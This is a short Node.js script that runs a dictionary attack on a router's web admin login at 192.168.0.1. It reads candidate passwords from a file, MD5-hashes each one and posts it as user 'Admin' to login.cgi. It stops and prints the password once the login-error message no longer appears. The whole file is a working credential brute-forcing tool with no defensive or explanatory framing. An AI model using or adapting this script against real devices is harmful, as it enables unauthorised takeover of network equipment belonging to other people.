const fetch = require("node-fetch");
const md5 = require("md5");
const fs = require("fs");

async function tryPassword(passwd, plain) {
	await fetch("http://192.168.0.1/login.cgi", 
		{"credentials":"include",
		"headers":{
			"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
			"accept-language":"en-US,en;q=0.9",
			"cache-control":"max-age=0",
			"content-type":"application/x-www-form-urlencoded",
			"upgrade-insecure-requests":"1"},
			"referrer":"http://192.168.0.1/login.htm",
			"referrerPolicy":"no-referrer-when-downgrade",
			"body":"username=Admin&password="+passwd+"&submit.htm%3Flogin.htm=Login",
			"method":"POST",
			"mode":"cors"})
			.then(res => res.text())
			.then(res => {
				console.log(`*****\tTRYING ${plain}`);
				if (res.indexOf("Username or password error, try again!") === -1) {
					console.log(`THE PASSWORD IS ${plain}`);
					process.exit(0);
				}
			})
}

fs.readFile("def.txt", async (err, data) => {
	if (err) {
		console.log(err);
		return;
	} 
	const passwds = data.toString().split("\r");
	for (let i of passwds) {
		await tryPassword(md5(i.trim()), i.trim());
	}
});

